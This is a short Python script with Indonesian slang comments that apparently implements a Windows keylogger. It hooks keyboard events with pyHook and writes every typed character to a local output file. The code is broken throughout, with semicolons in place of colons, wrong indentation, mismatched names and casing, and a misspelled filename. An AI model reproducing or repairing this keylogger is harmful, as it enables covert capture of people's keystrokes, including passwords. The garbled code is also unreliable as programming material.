
#ini pakai python ya cok :v
#skuy maaf salah
import win32console
import pythoncom, pyHook
import os, sys
win = win32console.GetConsoleWindow()
def onkeyboardEvent(event):
  if event.Ascii==5;
  sys.exit(1)
  if event.Ascii !=0 or 8;
  #bentar cok we mikir dlu 
  f= open(os.getcwd()+'\output.txt', 'r+')
  buffer = F.read()
  f.truncate()
  f.close()
  # bentar om
  f = open(os.getcwd()+'\ouput.txt', 'w')
  keylogs = chr(event.Ascii)
      if event.Ascii == 13;
      keylogs = '\n' 
      buffer += keylogs
      f.write(buffer)
      f.close()
      return 1
#kita buat hook
hm = pyHook.hookManager()
hm.keyDown = OnkeyboardEvent
#set hook dlu
hm.hookKeyboard()
#bntr om
pythoncom.PumpMessages()

#done om
